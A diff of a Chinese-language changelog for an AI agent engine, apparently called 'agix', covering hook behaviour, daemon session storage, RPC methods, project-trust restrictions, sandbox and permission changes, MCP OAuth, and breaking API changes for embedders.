-  但不起作用。`agent` hook 的 `ok: true` 记为 `approve`,所以配在 `PreToolUse` 上的 agent hook
-  答 `ok: true` 也有这个效果。
-- `agent` hook 的 `model` 生效:子 Agent 跑在这个模型上,按会话的路由选 provider。以前这个字段
-  被忽略,子 Agent 用会话的模型。
-- hook 回答里的 `suppress_output` 不再是一个字段(写了也不报错):引擎从不把 hook 的 stdout
-  交给模型或宿主,没有可隐藏的。
-- `async_rewake` 在 daemon 里生效:会话的运行中任务(子 Agent、后台命令、Monitor)有一个结束,
-  就算唤醒信号,等着的 hook 在会话处理下一条输入之后、等再下一条之前重跑。以前 daemon 不接
-  唤醒通道,这类 hook 永远不会重跑。
-- hook 新增 `on_error`(四种后端都认):缺省 `"allow"`,失败照旧放行;写 `"block"` 的,超时、
-  出错、command 退出码不是 0 或 2、回答不是 JSON,都等于它回答了 `decision: "block"`,理由写明
-  是哪个 hook、怎么失败的(`hooks.md`"失败"一节)。
-- **`TaskCompleted` 在任何运行中任务结束时都发**(完成、失败、被停下),与 `TaskCreated` 成对,
-  `reason` 是这个任务的 JSON(`task_id`、`kind`、`status`……)。团队成员一轮正常结束时的那次
-  `TaskCompleted`(带 `team_name` / `teammate_name`)照旧;只想要后者的 hook 改成看 payload 里
-  有没有 `team_name`,或者改用 `TeammateIdle`。
-- HTTP hook 新增 `allow_local`(缺省 `false`):写 `true` 的可以指向本机或内网,只放开 url 里的
-  主机与端口,重定向到别的内部目标照旧被拒。
-- 无人值守的 MCP server(`client_credentials`、`enterprise`)拿到的令牌寿命短于 30 秒左右时,
-  调用不再间歇地以"需要授权"失败:令牌何时重新取由 daemon 决定,底层的 OAuth 客户端不再因为
-  它"快到期"而拒绝使用刚取到的令牌。
-- 在会话自己的工作树(`EnterWorktree` 建在 `.agix/worktrees/<名字>/` 下)里写文件、跑命令
-  不再当作改 agent 配置去询问,按项目里的普通文件判;无人值守会话以前在工作树里一写就被拒。
-  工作树里的 `.agix`、`.claude`、`.git` 照旧要确认。
-- 带 `output_schema` 的 `session.startAgent` 子 Agent 交结果(`StructuredOutput`)不再询问宿主:
-  会话本身没有 schema 时没有这个工具,以前子 Agent 的调用按"未知工具"去问,无人答就一直等着。
-  现在子 Agent 的调用按它自己那份工具判,父会话的规则照旧适用(deny 了 `StructuredOutput`
-  的照样拒)。
-- 启动时还不存在的 skill 目录(项目第一次建出 `.agents/skills/`)里后来写进的 skill 能用上了:
-  下一次有请求用到这个项目的配置(`commands.list`、建会话等)时按新出现的目录重载,运行中的会话
-  在下一轮之前重建,这个目录此后也被监视。以前只有显式 `config.reload` 或重启才看得到。
-- **项目信任(`ARCHITECTURE.md` §6.6)。** 全局设置多了 `project_trust: { default, trusted }`。
-  没被信任的项目按插件级信任处理:它的 `permission_mode` / 规则 / 沙箱设置只能收紧,
-  `hooks_config`、`mcp_servers`、`scripts` 不生效,`.agix/hooks/` 不进 hook 的 `PATH`,
-  `.agix/agents/` 里的类型只能收紧、不替换同名类型,`.agents/skills/` 里的 `` !`cmd` `` 不执行。
-  **0.3.10 缺省 `default: "trusted"`,什么都不变**;`daemon.doctor` 多了一项 `project.trust`,
-  项目里有要信任才生效的东西而只靠缺省被信任时报 `degraded`,把它们列出来。
-  `project_trust` 只从全局层读,场景层、项目层里写的忽略。
-- 未信任的项目同样扣下决定东西送到哪里的键:`providers`(整段)、指向项目自己 provider 的
-  `default_provider` / `task_models` 条目、`model.base_url` / `model.auth_token`、`telemetry_url`、
-  `recorder`、`instruction_file`,以及放进更多插件的 `plugins` 值;它的 skill 的 `allowed-tools`
-  不授予任何东西;全局层、场景层里相对路径的脚本绑定在未信任的项目里不绑定。这些都列进
-  `requires_trust`,所以只改了 `providers.*.base_url` 的仓库也会让宿主弹出信任对话框。
-  **自己往项目层写 provider、模型端点的部署**(在项目的 `.agix/settings.json` 里写 `model`、
-  `providers` 的宿主)在 0.4 之前要把这些项目目录写进 `trusted`,否则翻缺省之后它们不生效。
+
+#### daemon 与会话存储
+
+- 同一状态目录下的两个 daemon 不能同时写一个会话:会话在一个 daemon 里活着时,另一个对它
+  `session.resume` / `session.run_turn` 报 `INTERNAL_ERROR`,消息含 "being written by another
+  process"(以前要么两边交错写进同一份日志,要么 resume 失败后换一个新 id 建会话)。
+- 会话日志最后一行写到一半(崩溃、断电)时,读的时候略过那一行而不是整份会话读不回来,
+  下一次追加前把它截掉。
+- 压缩标记(`compact` 行)写盘失败时,下一次落盘先补写它,之后的行跟在它后面;写进去了
+  只是 fsync 失败的,只重试 fsync。以前会把压缩后的消息当普通行再写一遍,日志里同样的内容
+  出现两次,恢复出来的会话前面多出一段已经被压掉的历史。
+- `session.delete`,以及 `session.close` / `session.delete` 级联删掉的会话,连同
+  `sessions/<id>/` 整个目录一起删(会话记忆、metadata、输入历史);以前只删 `metadata.json`。
+  会话还在本 daemon 里活着时只留下空的 `writer.lock`。
+- `daemon.shutdown`、SIGINT / SIGTERM 先停止接受新连接再关会话;关停期间已连着的连接上新建或
+  带回内存会话报错 `the daemon is shutting down`。以前关停的那几秒里还能建出会话来。
+- Unix socket 建好后改成 `0600`,daemon 为它新建的目录是 `0700`;以前随 umask(通常 `0755`)。
+  别的用户本来就连不上(没有写权限),放宽了 umask 的部署才受影响。
+- `daemon.lock` 在 daemon 运行期间持有 `flock`:两个 daemon 同时启动只有一个能起来,另一个报
+  "another daemon is already running"。以前两个可能都起来,后起的删掉先起的那个的 socket。
+- 被驱逐的会话再用时,先等它旧的运行体停下(`SessionEnd` hook 跑完,最多 5 秒)再重建;以前
+  旧的 `SessionEnd` hook 可能和重建出来的会话的 `SessionStart` 同时在跑。
+- `--listen` 绑定非回环地址时启动打一条 warn:TCP 不加密,token 明文传输。
+
+### RPC 客户端
+
+#### 权限与计划模式
+
+- `ExitPlanMode` 回到 `EnterPlanMode` 之前的模式,不再一律回 `default`。
+- 计划模式里的 `ExitPlanMode` 不再被"plan mode forbids non-readonly tools"拒掉,而是照常询问
+  (`prompt`,`tool_name: "ExitPlanMode"`):`permit` 退出,`deny` 留在计划模式。以前计划模式
+  经 RPC 退不出来。
+- `session.resume` 对活着的会话报它此刻的 `permission.mode`(进了、退了计划模式之后的),
+  不再报建会话时的。
+
+#### 方法、帧与错误
+
+- **`options` 逐字段读,被忽略的报在响应里。** `session.create` / `session.run_turn` /
+  `session.resume` 的 `options` 里不认识的字段、值读不出来的字段(`"permission_mode": "plann"`)
+  被忽略、其余照常生效,列在 `result.ignored_options`(`[{field, error}]`)里并记 warn。以前一个
+  字段错了整份 `options` 悄悄当没传,`permission_mode`、`permission_rules` 一起丢掉。**0.4 起
+  改为拒绝**(`INVALID_PARAMS`),现在就该把 `ignored_options` 当错误处理。
+- 会话建不回来时(例如它记录的 `provider` 已不在配置里),`session.run_turn` / `session.resume`
+  报 `INTERNAL_ERROR`,不再换一个新 id、在默认项目和默认场景里建会话顶替(以前 `run_turn`
+  会在那个新会话里照常跑完这一轮,结果的 `session_id` 不是请求里的那个)。
+- 没有 `id` 的请求(通知)不再收到响应帧,出错和 `TOO_MANY_IN_FLIGHT` 也不回。靠无 `id` 请求
+  拿结果的客户端要带上 `id`。
+- `session.run_turn` 的 `message` 为空或只有空白、又没有附件,报 `INVALID_PARAMS`,不再当作
+  一轮发给模型。
+- `turn_complete` 多了可选的 `truncated: true`:OpenAI 兼容的流既没有 `[DONE]` 也没有
+  `finish_reason` 就关了时出现(仍当作回复结束,daemon 另记一条 warn),回复可能不完整;遥测
+  `api_request` 上同样标 `truncated: true`。其余情况没有这个键。
+- 新帧 `notification`(`{message,status}`,协议 §7):模型调用 `PushNotification` 时发给会话的
+  订阅者,同时触发 `Notification` hook(`reason` 为通知正文,`tool_name` 为
+  `PushNotification`)。宿主该把它当通知送到用户面前;macOS 上引擎所在的机器仍顺带弹一条
+  桌面通知,失败不算错。
+- `/cost` 报的是会话自载入以来模型调用数、工具调用数和厂商报回的四项 token,不再是按字符数
+  估的美元数。
+- `session.interrupt` 在模型还没开始回答时(等响应、退避重试之间)也立即生效。回复写到一半被
+  打断的一轮以 `stop_reason: "cancelled"` 结束,不再走正常收尾(`stop_reason` 为空、照跑 Stop
+  hook、送达排队消息)。
+- 新方法 `mcp.auth.start` / `mcp.auth.complete` / `mcp.auth.cancel` / `mcp.auth.logout`,新通知
+  `mcp_auth_required` / `mcp_auth_completed` / `mcp_auth_failed`,新错误码 `MCP_AUTH_FAILED`
+  (-32021)。`mcp.status` 的元素多了 `auth`,`state` 多了 `auth_required`。
+- `mcp.status` 的 `state` 多了 `disconnected`、`connecting`、`failed`(带 `error`);
+  `mcp_connect_failed` 的 `error` 写明原因,不再是"看 daemon 日志"。
 - 新方法 `project.status`、`project.trust`(协议 §6.8),新通知 `project_trust_changed`,新错误码
   `PROJECT_UNTRUSTED`(-32022,`mcp.addServer` / `mcp.updateServer` / `config.setProvider`
   写进未信任的项目时),`mcp.status` 多了 `state: "untrusted"`,`session.create` /
@@ -912,120 +934,17 @@ WebAssembly 载体整个移除。
   记下的是解析之后的真实目录(`..`、符号链接展开),glob 元字符转义;`matched` 报的因此是这个
   真实路径,不是调用时写的那个。匹配 `trusted` 条目时,带 `.` / `..` 的项目根只按解析之后的
   目录比。
-- 设置文件里一个值类型不对(`"language": 5`)不再让整份合并结果退回内建缺省(连全局层的 hook、
-  沙箱设置一起丢掉):只丢这个值,warn 一条,`daemon.doctor` 的 `settings.tiers` 报 `degraded`,
-  `settings_tiers[].ignored_values` 列出它。以前靠"写错一个值就等于什么都没配"的,现在其余的
-  值都生效。
-- `config.setProvider`、`mcp.addServer` / `updateServer`、`project.trust` 与权限询问里的"永久
-  允许"改设置文件时上锁(跨进程也互斥)、写临时文件再改名替换;`settings.local.json` 每次写都是
-  0600(以前"永久允许,本项目"会把它改成 umask 权限,通常是 0644)。设置文件是符号链接的,
-  这些写入都拒绝(`INVALID_PARAMS` / 报错),不再顺着链接写目标文件;用 dotfile 链接管理
-  `~/.agix/settings*.json` 的,要么改目标文件,要么换成普通文件。
-- **0.4 会把 `project_trust.default` 改成 `untrusted`。** 现在就该做的:桌面宿主在打开项目时
-  调 `project.status`,`requires_trust` 不空就问用户、用 `project.trust` 记下回答;自己创建项目
-  目录的无人值守部署(写项目层 `mcp_servers` / `permission_mode` 的那种)在全局
-  `settings.json` 里写 `"project_trust": {"trusted": ["<项目目录>/**"]}`。可以先把 `default` 设成
-  `untrusted` 试跑,`daemon.doctor` 与 `project.status` 会说哪些东西被扣下了。
+- `plugin.install` / `plugin.uninstall` 的 `name`、`version` 只收 1–128 个 ASCII 字母、数字、
+  `.`、`_`、`-`、`+`,不以 `.` 开头,别的报 `INVALID_PARAMS`(以前 `{"name": "/"}` 会把根目录
+  下的目录逐个当版本删掉);`plugin.install` 还要求包里 `[plugin] name` 等于 `name`。
+- 团队的 `SendMessage` 只投给团队声明过的成员,`peer` 不在其中时报错并列出成员;提示词改成与
+  schema 一致的 `{"peer", "message"}`(以前教的 `to` / `summary` / `"*"` 广播从来不被接受)。
+  不是纯 ASCII 文件名的成员标签,邮箱文件改名为 `mailbox/~<hash>.jsonl`。
+- `session.export` 的 `runtime.json` 去掉 `plan_text`(一直是 `null`)。
 
 ### 嵌入方
 
-- `Settings` 多了 `project_trust`(全局层的设置)、`project_layer`(`Settings::load` 算出的
-  信任判定与 `requires_trust`,不读不写文件)与 `ignored_values`(加载时因类型不对丢掉的值,
-  `base::settings::IgnoredValue`);用结构体字面量构造的要补这三项(`Default::default()` /
-  `Vec::new()`)。代码里造的 `Settings` 的 `project_layer` 缺省是"没有项目层",什么都不扣。
-  `base::context::EngineConfig` 多了 `project_untrusted`。新模块 `base::project_trust`(含
-  `exact_pattern`)与 `base::settings_file`(设置文件的加锁读改写)。
-- `permissions::settings_patch::AppendError` 改为 `File(base::settings_file::SettingsFileError)`、
-  `NoFileName`、`NotAList` 三支;去掉 `Io` / `BadJson` / `NotObject`。穷举匹配它的要跟着改。
-- `assembly::doctor::SettingsTiersCheck::new` 多一个 `&Settings` 参数(报它加载时丢掉的值)。
-- `base::agent_type::AgentTypeSource::LocalFile` 拆成 `User`(全局 / 场景的 `agents/`)与
-  `Project { trusted }`,多了 `may_shadow()`。`agents::agent_tool::{merge_agent_types,
-  load_agent_types_from_dir}`、`SharedAgentTypeCatalog::{build, unwatched, refresh}`、
-  `AgentTool::with_parent_tools` 的目录参数换成 `&[(PathBuf, AgentTypeSource)]`
-  (`load_agent_types_from_dir` 多一个 `source`);新增 `agent_type_dirs(&Settings)` 按设置给出这三层。
-
-- `hooks::config::HookConfig::{Prompt, Agent}` 多了 `may_approve: bool`(结构体字面量要补;
-  `false` 即它的批准不算)。
-- `DaemonServer::bind_unix` 把 socket 登记给沙箱(`base::interface::exec::local::sandbox::
-  fence_socket`),`serve_tcp_listener` / `serve_ws_listener` 登记端口(`fence_port`);
-  `serve_unix_listener` 拒绝本进程起的进程(`base::interface::exec::local::lineage::started_here`)。
-  自己 bind 监听器、不经 `bind_unix` 的,调一次 `fence_socket`。嵌着 daemon 的进程里,自己起的
-  子进程连不上这个 socket:要连的客户端得是宿主自己或者别的、不由它起的进程。
-- `base::interface::exec::SandboxPolicy` 多了 `deny_ipc_escapes`,`base::tool::SandboxSettings`
-  与 `base::context::config::SandboxPolicyConfig` 多了 `unattended_requires_network_policy`;
-  用结构体字面量构造它们的要补字段(或改用 `..Default::default()`)。
-- `AgentEvent` 多了 `Notification { message, status, turn_id }`;穷举匹配它的要补一支。
-- `AgentEvent::TurnComplete` 多了字段 `truncated`,`ModelEvent` 多了变体 `Truncated`(OpenAI
-  兼容适配器在补出的 `EndTurn` 之前发),`telemetry::ApiRequestPayload` 多了 `truncated`。
-  用结构体字面量构造前两者 / 穷举匹配 `ModelEvent` 的要跟着改。
-- `telemetry`:`EventPayload` 去掉上面那 15 个变体及其 payload 类型,多了 `KINDS`;
-  `TurnStartPayload` / `TurnCompletePayload` 去掉 `turn_no` / `turn_id`,`UserPromptSubmitPayload`
-  只剩 `char_count` / `attachment_count`,`SlashCommandUsedPayload` 是 `{command, kind, has_arg}`,
-  `ApiErrorPayload` 的 `http_status` 变 `Option<u16>`、去掉 `retry_count`,
-  `PermissionDecisionPayload` 去掉 `rule_source`、`PermissionDecisionOutcome` 去掉
-  `Escalated` / `Remembered`,`AgentSpawnedPayload` 是 `{agent_id, role, model?, stage_name?,
-  background}`,`AgentCompletedPayload` 去掉 `turn_count` / `tool_call_count`,
-  `McpServerConnectedPayload` / `McpConnectionErrorPayload` 精简,`StartupTimingPayload` 见上,
-  `SessionEndPayload` 去掉 `total_cost_usd` / `total_errors`。`telemetry::cost`、`telemetry::stats`
-  删除。`RedactionPolicy` 与 `TelemetryConfig` 去掉 `redact_prompts` / `redact_tool_content`
-  (`RedactionPolicy` 还去掉 `redact_secrets`、`has_content_redaction`),新增
-  `RedactionPolicy::scrub_message`。`TelemetryHandleError` 多了 `Io`,`FileRecorder::record`
-  写失败返回它;新增 `FileRecorder::with_max_bytes`,去掉 `FileRecorder::exists`。
-- `team::prompt::build_coordinator_prompt` 删除(没有地方读它)。
-- `McpServerConfig::InProcess` 删除,`McpPolicyGate::admit` 不再豁免它。`McpServerConfig` 新增
-  `confined_to_own_env()`,`mcp::config` 新增 `expand_vars_with`;`McpError` 新增 `is_permanent()`。
-- `base::interface::mcp_servers::McpServers` 多了必须实现的
-  `async fn refresh_if_changed(&mut self) -> bool`;回合循环在工具步骤之后调它,不再调
-  `refresh_tools`(`EngineCommand::RefreshMcp` 仍然全量重列)。
-- `mcp::notify::NotificationQueue` 删除,换成 `Announcements`(按 server、按种类计数,
-  `sink()` / `record()` / `of()`)与 `ListEpochs`;`McpManager::refresh_tools_if_announced` 改名
-  `refresh_if_changed`(也重读宣布过变化的 prompt),`pending_notifications` 删除。`share()`
-  出来的 manager 与原来那个读同一份通知。`McpManager::refresh_tools` / `refresh_prompts` 对
-  列表失败的 server 保留它原有的工具 / prompt。`NotifyingHandler` 多了 `keeping()`。
-- `base::interface::exec::local::orphans` 新增 `list(group) -> Listed`(drop 时移出登记)与
-  `listed()`。
-- `mcp::output_cache::MAX_CACHED_RESULT_BYTES` 新增。
-- `AnthropicModel::stream` / `OpenAICompatibleModel::stream` 在返回前等到厂商开始回答:请求被拒
-  (状态码、连不上、重试用尽)从 `stream()` 返回 `Err`,不再是流的第一项;两者都认传进来的
-  `CancellationToken`,取消时 `stream()` 返回 `ModelError::Cancelled`,流里出 `Err(Cancelled)` 后结束。
-  一个什么都没发就结束的 Anthropic 响应是 `ModelError::Network`。
-- 流里的 `error` 事件按它的 `type` 分类(`overloaded_error` → `Overloaded`、`rate_limit_error` →
-  `RateLimited`、`invalid_request_error` → `Api{400}`……),不再一律 `Api{500}`;Chat Completions
-  流里的 `{"error":…}` 块同样成为 `Err`(`ChatCompletionChunk` 多了 `error` 字段)。
-  `AnthropicError::StreamInterrupted` 映射为 `ModelError::Network`(原为 `Internal`)。
-- `model::stream::ContentBlockStart` 与 `BlockDelta` 多了 `Unknown`:不认识的块类型、增量类型
-  跳过这一块,不再让整条流解析失败;穷举匹配它们的要补一支。
-- 自己实现 `Model` 的:流必须以 `ModelEvent::EndTurn` 收尾,没有它的流被当作中途断开。
-- `ModelEvent` 多了 `MalformedToolUse { id, name, raw_input }`:参数解析不了的工具调用,两个
-  内置适配器以它代替 `ToolUse { input: {} }`;穷举匹配 `ModelEvent` 的要补一支,自己实现
-  `Model` 的也该这样报。
-- `InputMessage::ToolResult` 的 `tool_use_id` 必须是最近一条回复里还没有结果的调用,否则
-  `process_turn` 返回 `TurnError::Internal`、transcript 不变。发往模型的请求里,不对应前一条
-  回复里任何 `tool_use` 的 `tool_result` 被去掉。
-- `runtime::context`(`AgentContext`)删除,从来没有调用方。
-- `EngineConfig::file_limits` 的 `max_tool_result_chars` 删除(从没有地方读它;单条工具结果的
-  上限是压缩器的 50,000 字符);`default_read_lines`、`max_line_chars` 现在真的决定 `Read` 的
-  默认行数与单行上限(以前写死 2000)。新增 `base::tool::MAX_IMAGE_BYTES`。
-- `ToolExec::with_timeout` 起的计时任务随这次调用结束,不再睡到超时。
-- `AgentSpawner::spawn_agent_with_tools` 的默认实现在收到非空 `extra_tools` 或 `permission_mode`
-  时返回错误,不再悄悄丢掉它们去调 `spawn_agent`;支持团队的 spawner 要自己实现它。
-  `RuntimeAgentSpawner` 按 `allowed_tools`(非空时)收窄子 Agent 的工具,以前忽略。
-- `team::lock` 删除(没有调用方)。`AgentTool::resume_agent`、`Agent::seed_history` 删除(只有
-  测试调用)。
-- `Agent` 被丢弃时清空它的会话工具注册表(`InMemoryToolRegistry::clear`,新增),并取消
-  `SessionContext::session_ended()`(新增)给出的令牌;模块里活得比一轮长的东西(常驻成员)
-  挂在它上面。会话的工具彼此引用(`Agent` 工具在它所在的注册表里、团队工具经 spawner 回到
-  `Agent` 工具),不清空的话整套都不会被释放。`AgentTool::set_hooks` 只弱持 runner;新增
-  `AgentTool::set_session_ended`。
-- `ExecutionSettings` 多了 `max_agent_depth`。
-- `runtime::streaming::execute_stream` 返回 `Result<StreamResult, StreamFailure>`(原为
-  `Result<_, TurnError>`);`StreamResult` 多了 `cancelled`。
-- `StopRecovery` 多了 `Continue`,`DefaultRecovery` 对 `pause_turn` 返回它;穷举匹配
-  `StopRecovery` 的要补一支。
-- `HttpAnthropicClient::with_base` 自己把 base 归成 `…/v1/messages`(新增
-  `model::client::messages_url`),调用方不用再补结尾的 `/`(以前不补,`https://relay/anthropic`
-  的 `anthropic` 会被换掉);不能带路径的 URL(`data:`)在这里报 `AnthropicError::ParseError`,
-  不再等到第一次请求。
+#### 权限与沙箱
 
 - `PermissionMode::Auto`、`PermissionMode::Yolo` 删除(`base::permission` 与
   `base::settings` 两份都删),用 `BypassPermissions`。`permissiveness()` 的取值跟着变了。
@@ -1039,20 +958,6 @@ WebAssembly 载体整个移除。
 - `SessionState` 多了 `bind_tools()` / `tool()`:会话派发工具用的注册表,`runtime::agent::Builder::build`
   绑上。`RuleSetPermission::check_for_delegate` 先在 delegate 的注册表里找工具,找不到才用自己的;
   自己实现 `Permission` 又要判 delegate 调用的,同样可以用 `delegate.tool(name)`。
-- 自己实现 `Compactor` 的:引擎传给 `compact` 的 `max_tokens` 在自动压缩时是阈值减去
-  请求的固定开销与必然补回的提醒;返回的策略不是 `NoOp`、对话却没有变小(连同补回的提醒
-  一起算)的,引擎不采用。`DefaultCompactor` 的兜底一条都折不掉时返回 `NoOp`。
-- `CompactError::Exhausted` 删除(从没有构造过);`compaction::reactive` 删掉零调用的
-  `ReactiveCompactConfig`、`CompactionLevel`、`calculate_thresholds`、`compaction_level`、
-  `should_compact_with_state` 与 `CompactionState::last_compact_turn`。新增
-  `compaction::llm_summary::is_summary`。
-- `ToolResultBudget` 的 `max_per_result` / `max_total` 改按字符计(以前是字节);新增
-  `compaction::compact::TOOL_IMAGE_CHARS`。
-- `compaction::cached::clear_stale_tool_results` 保留 `tool_use_id`(以前置空,请求会被拒),
-  已经清过的不再计数、不再报进 `cache_edits`。
-- `SessionManager::replace_messages_after_compact` 自己重排 `message_timestamps`(压缩留下的
-  尾部保留原来的时间,前面新插入的记为现在),调用方不要再 `truncate` 它;`resume` 之后的
-  `turn_count` 是用户发起的轮数(用户消息与斜杠命令展开),不再是日志行数。
 - `Tool` 多了 `accept_edits_allows(input, ctx)`(缺省即 `is_read_only(input)`),`acceptEdits`
   的模式分派用它代替 `is_read_only`;自己包一层 `Tool` 的要转发它(`DeferredTool` 已转发)。
   新增 `permissions::invocation::{traced_invocations, Traced}` 与
@@ -1074,30 +979,52 @@ WebAssembly 载体整个移除。
   `PermissionMode::for_delegate`(两个 `PermissionMode` 上都有)。
 - `base::permission::PermissionMode` 多了 `min_permissive`,并能 `into()` 成
   `base::settings::PermissionMode`。
-- `base` 的 cargo feature `team-mode`、`plugin-marketplace`、`experimental-agent` 删除
-  (什么也不控制)。`base::features` 整个删除,`Settings::feature_flags` 随之去掉;
-  `CompactionConfig` 多了 `reactive` 与 `cached_microcompact`。
 - `SessionState` 去掉 `plan_text` / `set_plan_text` / `clear_plan_text` 与 `plan_slug` 那三个;
   `compaction::compact::PostCompactContext` 去掉 `plan_content`。
 - `runtime::agent::Agent` 去掉 `set_plan_mode`、`register_running_task`、`clear_running_tasks`:
   压缩后的提醒现在直接读会话状态——处于 plan 模式、还在跑的后台任务,在丢掉或总结了历史的
   压缩(不含只清工具结果的 MicroCompact)之后各补一条。
 - `tools::plan_verify` 模块与 `tools::plan_mode::{plan_text, plan_state_for_test}` 删除。
-- `base::frozen::find_relevant_memories`、`base::memory::select_memories_with_llm`、
-  `MemoryStore::scan_memory_headers` 删除;按相关性挑记忆用 `base::memory::select_memories_from`
-  (生产路径 `MemoryRetriever` 一直走它)。
-- `SkillCatalog` 多了 `expand`(有缺省实现:正文加参数替换,不执行、不授权),返回新类型
-  `base::interface::skill_catalog::SkillExpansion { text, grants }`;包一层 `SkillCatalog` 的
-  要把它转发下去,否则 `/name` 拿到的是缺省展开。新增 `skills::expand_for_invocation` /
-  `skills::ExpandError` 与 `CommandRegistry::run_prompt_command`(斜杠命令在轮里走的就是它)。
-  `SkillManager::get_skill_content` 对磁盘 skill 返回去掉 frontmatter 的正文。
-- 新增 `MemoryStore::for_paths`(会话用的记忆目录唯一的推导处)、`user_dir`、`record_recalled`,
-  `base::memory::{memory_prompt, MAX_MEMORIES}`;`scan_for_secrets` / `SecretPattern` 挪到
-  `base::memory`(`team::team_memory` 里照旧可用)。`assemble_prompt` 的 `memory_store` 参数
-  现在真的被用来出 `# Memory` 一节,传进去的应是会话的那个 store。`FrozenContext::memory_dir`
-  是全局记忆目录,`memory_index` 是两处合并的索引。
-- `hooks::HookRunner::set_network`、`auth::OAuth2Client::with_network` 删除;后者要换出口直接设
-  `net` 字段。
+- `base::interface::exec::SandboxPolicy` 多了 `deny_ipc_escapes`,`base::tool::SandboxSettings`
+  与 `base::context::config::SandboxPolicyConfig` 多了 `unattended_requires_network_policy`;
+  用结构体字面量构造它们的要补字段(或改用 `..Default::default()`)。
+- `DaemonServer::bind_unix` 把 socket 登记给沙箱(`base::interface::exec::local::sandbox::
+  fence_socket`),`serve_tcp_listener` / `serve_ws_listener` 登记端口(`fence_port`);
+  `serve_unix_listener` 拒绝本进程起的进程(`base::interface::exec::local::lineage::started_here`)。
+  自己 bind 监听器、不经 `bind_unix` 的,调一次 `fence_socket`。嵌着 daemon 的进程里,自己起的
+  子进程连不上这个 socket:要连的客户端得是宿主自己或者别的、不由它起的进程。
+  `DaemonServer::bind_unix` 把 socket 设为 `0600`(自己 chmod 的可以去掉)。
+
+#### 项目信任与设置
+
+- `Settings` 多了 `project_trust`(全局层的设置)、`project_layer`(`Settings::load` 算出的
+  信任判定与 `requires_trust`,不读不写文件)与 `ignored_values`(加载时因类型不对丢掉的值,
+  `base::settings::IgnoredValue`);用结构体字面量构造的要补这三项(`Default::default()` /
+  `Vec::new()`)。代码里造的 `Settings` 的 `project_layer` 缺省是"没有项目层",什么都不扣。
+  `base::context::EngineConfig` 多了 `project_untrusted`。新模块 `base::project_trust`(含
+  `exact_pattern`)与 `base::settings_file`(设置文件的加锁读改写)。
+- `permissions::settings_patch::AppendError` 改为 `File(base::settings_file::SettingsFileError)`、
+  `NoFileName`、`NotAList` 三支;去掉 `Io` / `BadJson` / `NotObject`。穷举匹配它的要跟着改。
+- `assembly::doctor::SettingsTiersCheck::new` 多一个 `&Settings` 参数(报它加载时丢掉的值)。
+- `base` 的 cargo feature `team-mode`、`plugin-marketplace`、`experimental-agent` 删除
+  (什么也不控制)。`base::features` 整个删除,`Settings::feature_flags` 随之去掉;
+  `CompactionConfig` 多了 `reactive` 与 `cached_microcompact`。
+
+#### MCP 与 OAuth
+
+- `McpServerConfig::InProcess` 删除,`McpPolicyGate::admit` 不再豁免它。`McpServerConfig` 新增
+  `confined_to_own_env()`,`mcp::config` 新增 `expand_vars_with`;`McpError` 新增 `is_permanent()`。
+- `base::interface::mcp_servers::McpServers` 多了必须实现的
+  `async fn refresh_if_changed(&mut self) -> bool`;回合循环在工具步骤之后调它,不再调
+  `refresh_tools`(`EngineCommand::RefreshMcp` 仍然全量重列)。
+- `mcp::notify::NotificationQueue` 删除,换成 `Announcements`(按 server、按种类计数,
+  `sink()` / `record()` / `of()`)与 `ListEpochs`;`McpManager::refresh_tools_if_announced` 改名
+  `refresh_if_changed`(也重读宣布过变化的 prompt),`pending_notifications` 删除。`share()`
+  出来的 manager 与原来那个读同一份通知。`McpManager::refresh_tools` / `refresh_prompts` 对
+  列表失败的 server 保留它原有的工具 / prompt。`NotifyingHandler` 多了 `keeping()`。
+- `base::interface::exec::local::orphans` 新增 `list(group) -> Listed`(drop 时移出登记)与
+  `listed()`。
+- `mcp::output_cache::MAX_CACHED_RESULT_BYTES` 新增。
 - `auth` crate 整个删除(`OAuth2Client`、`TokenStore`、`CallbackListener`、`PkceVerifier`、
   `ProviderConfig`……),它只有 MCP 在用;OAuth 现在是 `mcp::oauth`,协议部分用 rmcp。
 - `mcp::oauth::{McpOAuth, McpOAuthStore, McpOAuthResolver}` 删除,`McpAuth` 取代 `McpOAuth`;
@@ -1124,40 +1051,11 @@ WebAssembly 载体整个移除。
 - `Assembly` 多了 `mcp_enterprise_idp: Option<mcp::config::EnterpriseIdp>`;`McpPolicy` 多了
   `allowed_authorization_servers`、`enterprise_idp` 两个字段(结构体字面量要补,或用
   `..Default::default()`)。`McpOAuthConfig` 多了 `grant`、`private_key_jwt`。
-- `history::store::HistoryStore` 多了 `sync` 与 `claim`(都有缺省实现),新类型
-  `history::store::SessionClaim`;`HistoryError` 多了 `Locked`(穷举匹配的要补一支)。
-  `JsonlHistoryStore` 的 `append` 不再承诺立即持久,`sync` 才是;`delete` 在会话被别的进程
-  占着时报 `Locked`。`SessionManager::persist` 写了东西就 `sync` 一次。包装别的 store 的
-  实现要把这两个方法转发下去,否则拿到的是什么都不做的缺省。
-- `history::blob::PasteStore::cleanup` 删除(按 mtime 删,不管还有没有日志引用)。
-  `JsonlHistoryStore` 的写锁按会话分开,一个会话的 IO 卡住不再挡别的会话;
-  `set_session_title` 与 append 拿同一把锁,另一个进程占着这个会话时同样报 `Locked`。
-- `transcript::ExtensionsAreVisible` 对它不覆盖的扩展条目照引擎的规矩处理(`agix.context` 的
-  drop / edit 照样生效);`LogEntry::ToolResult` 只并进全是工具结果的末尾 User,同一个
-  `tool_use_id` 只并一次。
-- `team::mailbox::MailboxStore::send` 返回 `Result<(), UnknownPeer>`,不是成员的收件人被拒;
-  新增 `MailboxStore::check_peer` 与 `team::mailbox::mailbox_file`(标签到文件名)。
-- `plugin::cache::check_component` 新增;`plugin::install::{install, uninstall}` 与
-  `PluginCache::remove_version` 对不合规的 `name` / `version` 返回 `PluginError::Schema`,
-  `remove_version` 还拒绝解析到 cache 之外的插件目录。
-- `daemon::write_lock_file` 返回 `DaemonLockGuard`(`Deref` 到 `DaemonLock`),持有期间占着
-  `flock`,drop 时删掉锁文件;不要再自己删。新增 `discovery::create_private_dir`。
-- `SessionPool::shutdown_all` 一开始就拒绝再建会话,重复调用等第一次做完。新增
-  `DaemonServer::shutdown()`:先停监听再 `shutdown_all`,自己先 `shutdown_all` 再取消
-  `shutdown_token` 的嵌入方改用它。
-- `DaemonServer::bind_unix` 把 socket 设为 `0600`(自己 chmod 的可以去掉)。
-- `rpc::SessionOptions::from_params` 与 `rpc::IgnoredOption` 新增,`SessionOptions::FIELDS`
-  列出全部字段名。`base::settings::unknown_settings_keys` 新增。
-- `plugin::blocklist` 模块与 `PluginError::Blocked` 删除。`plugin::manifest::Plugin::path`
